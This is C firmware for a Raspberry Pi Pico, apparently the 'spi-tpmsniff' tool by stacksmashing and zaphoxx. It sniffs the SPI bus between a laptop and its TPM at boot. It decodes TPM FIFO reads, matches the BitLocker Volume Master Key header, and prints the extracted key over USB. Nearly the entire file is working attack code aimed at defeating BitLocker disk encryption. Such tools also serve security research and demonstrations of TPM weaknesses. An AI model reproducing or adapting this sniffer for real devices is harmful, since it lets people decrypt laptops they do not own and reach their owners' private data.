#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include "pico/stdlib.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "pico/multicore.h"

// Our assembled program:
#include "spi_sniffer.pio.h"
#include "hardware/flash.h"

#define JMP_PIN 5
#define BASE_PIN 2
#define TRIGGER_PIN 13
#define PSELECT0 14
#define PSELECT1 15
#define LED_PIN 25

unsigned char reverse(unsigned char b) {
   b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
   b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
   b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
   return b;
}

static inline char reverse_nibbles(char c) {
    return ((c<<4) & 0xF0) | ((c >> 4) & 0xFF);
}

static inline uint32_t fix_bit_format(uint32_t input) {
    char a1 = (input >> 24) & 0xFF;
    char a2 = (input >> 16) & 0xFF;
    char a3 = (input >> 8) & 0xFF;
    char a4 = input & 0xFF;
    return (a1 << 24) | (a2 << 16) | (a3 << 8) | a4;
}

enum state {
    STATE_IDLE,
    STATE_READING
};

static inline uint32_t fetch(PIO pio, uint sm) {
    uint32_t result_raw = pio_sm_get_blocking(pio, sm);
    uint32_t result = fix_bit_format(result_raw);
    return result;
}


bool is_Wait = false;
static inline uint8_t fetch_miso_byte(PIO pio, uint sm){
    uint8_t miso_byte = 0x0;
    uint16_t miso_msk = 0b1000000000000000;
    uint32_t data = fetch(pio, sm);
    for (int i = 0; i < 8; i++){
        miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i)));
        miso_msk = miso_msk >> 2;
    }
    // acknowledge wait state
    //printf("pWait:%02x ",is_Wait);
    is_Wait = is_Wait && (!( miso_byte & 0x01));

    //printf("--> WAIT:%02X - DO:%02x\n",is_Wait, miso_byte);
    return miso_byte;
}

static inline uint16_t fetch_message(PIO pio, uint sm) {
    uint32_t mosi_msg=0x0;
    uint32_t data;
    bool init = true;

    // reset wait state var
    while(1)
    {
        char miso_byte = 0x0;
        char mosi_byte = 0x0;
        uint16_t mosi_msk = 0b0100000000000000;
        uint16_t miso_msk = 0b1000000000000000;
        data = fetch(pio, sm);//( pio_sm_get_blocking(pio, sm) );
        is_Wait = false;
    
        for (int i = 0; i < 8 ; i++)
        {   
            mosi_byte = mosi_byte | ((char) ((data & mosi_msk) >> (7-i))) ;
            mosi_msk = mosi_msk >> 2;
            miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i))) ;
            miso_msk = miso_msk >> 2;
        }
        if (init) {
            mosi_msg = mosi_msg | mosi_byte;
        }else{
            mosi_msg = (mosi_msg << 8) | mosi_byte;
        }
        init = false;
        if (!((mosi_msg & 0xf0ff00ff) == 0x80D40024)) continue;
        // Read FIFO_0 0x8XD40024 where X holds the number of bytes to be transferred
        // 0b0000000 = 1 byte; 0b00000001 = 2 bytes ; 0b00000010 = 3 bytes etc. up to 64 bytes 
        uint16_t bytes_to_read = (uint16_t) ((mosi_msg >> 24) & 0b11111) + 1;
        
        // check if the last miso_byte is a WAIT state request
        is_Wait = (!( miso_byte & 0x01)); // if miso_byte last bit is 0 the it is a wait state request; if 1 then not
        //printf("[%08X] [%02X] (%d)\n",mosi_msg,miso_byte,is_Wait);
        
        return bytes_to_read;
    }
}

static const char vmk_header[] = {//0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
    0x2c, 0x00, 0x05, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
};

#define MAXCOUNT 512
uint32_t buf[MAXCOUNT];


char message_buffer[4096*2];
volatile size_t msg_buffer_ptr = 0;
bool byte_found = false;

void core1_entry() {
    PIO pio = pio0;
    uint offset = pio_add_program(pio, &spi_sniffer_program);
    uint sm = pio_claim_unused_sm(pio, true);
    spi_sniffer_program_init(pio, sm, offset, BASE_PIN, JMP_PIN);
    
    
    while(1) {
        uint16_t bytes_to_read = fetch_message(pio, sm);
        // acknowledge wait states
        
        while (is_Wait){
                // skip wait states
                char dummy = fetch_miso_byte(pio,sm);
                //printf("[(%d) %02d] %02x \n",is_Wait, bytes_to_read,dummy);
        }
        for(int n=0; n < bytes_to_read; n++){
            char message = fetch_miso_byte(pio,sm);
            message_buffer[msg_buffer_ptr++] = message;
	        if (!(message == 0x2c)) continue;
	    	multicore_fifo_push_blocking(msg_buffer_ptr);
        }
	}
}


int main() {
    set_sys_clock_khz(270000, true); // 158us
    stdio_init_all();
    
    gpio_init(TRIGGER_PIN);
    gpio_init(PSELECT0);
    gpio_init(PSELECT1);
    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN,1);
    gpio_set_dir(TRIGGER_PIN,1); // output
    gpio_set_dir(PSELECT0,0); // input 
    gpio_set_dir(PSELECT1,0); // input
    gpio_pull_down(TRIGGER_PIN);
    gpio_pull_down(PSELECT1);
    gpio_pull_down(PSELECT0);
    gpio_put(TRIGGER_PIN,0);
    gpio_put(LED_PIN,0);

    while (!stdio_usb_connected());

    puts(" _           ");
    puts("|_) o  _  _  ");
    puts("|   | (_ (_) ");
    puts("");
    
    puts("88P'888'Y88 888 88e    e   e        dP\"8         ,e,  dP,e,  dP,e,                ");
    puts("P'  888  'Y 888 888D  d8b d8b      C8b Y 888 8e   \"   8b \"   8b \"   ,e e,  888,8, ");
    puts("    888     888 88\"  e Y8b Y8b      Y8b  888 88b 888 888888 888888 d88 88b 888 \"  ");
    puts("    888     888     d8b Y8b Y8b    b Y8D 888 888 888  888    888   888   , 888    ");
    puts("    888     888    d888b Y8b Y8b   8edP  888 888 888  888    888    \"YeeP\" 888    ");
    puts("                                                                 - by stacksmashing");
    puts("                                                                 - spi-tpmsniff by zaphoxx");
    puts("");
    float f = (float) clock_get_hz(clk_sys);
    printf("[+] system clock frequency: %f Hz\n",f);
    // Wait for Trigger Pin to be Set
    // set it programmatically high 
    // later use button to trigger sniff start
    printf("[+] Push Laptops Start Button to start sniffing within the next 5 seconds!\n");
    // remove once hw button is implemented
    //gpio_put(TRIGGER_PIN,1);
    printf("[+] Ready in ...");
    for (int i = 0 ; i < 5; i++){
        printf("%d...", 5 - i);
        sleep_ms(1000);
    }
     
    printf("...SNIFF...\n");
    gpio_put(LED_PIN,1);
    
    multicore_launch_core1(core1_entry);

    while(1) {
        uint32_t popped = multicore_fifo_pop_blocking();
	    // printf("[%d, %d]\n",popped,byte_found);
        // Wait til the msg_buffer_ptr is full
        while((msg_buffer_ptr - popped) < 44) {}
        
        if ((memcmp(message_buffer + popped, vmk_header, 2) == 0) && \
            (memcmp(message_buffer + popped + 3, vmk_header + 3, 1) == 0) && \
            (memcmp(message_buffer + popped + 5, vmk_header + 5, 3) == 0) && \
            (memcmp(message_buffer + popped + 9, vmk_header + 9, 3) == 0))
        {    
            
            printf("[+] Bitlocker Volume Master Key found:\n");
	        printf("[+] VMK Header: ");
	        for (int i = 0; i < 12; i++)
	        {
	            printf("%02X ", message_buffer[popped + i]);
	        }
	    
	        puts("");
            for(int i = 0; i < 2; i++) 
            {
                printf("[+] ");
                for(int j = 0; j < 2; j++) 
                {
                    for(int k = 0; k < 8; k++) 
                    {
                        printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
                    }
                    printf(" ");
                }
                puts("");
            }

            // blinkyblink
            for (int i = 0 ; i < 100; i++){
                gpio_put(LED_PIN,1);
                sleep_ms(200);
                gpio_put(LED_PIN,0);
                sleep_ms(200);
            }
        }
    }
}
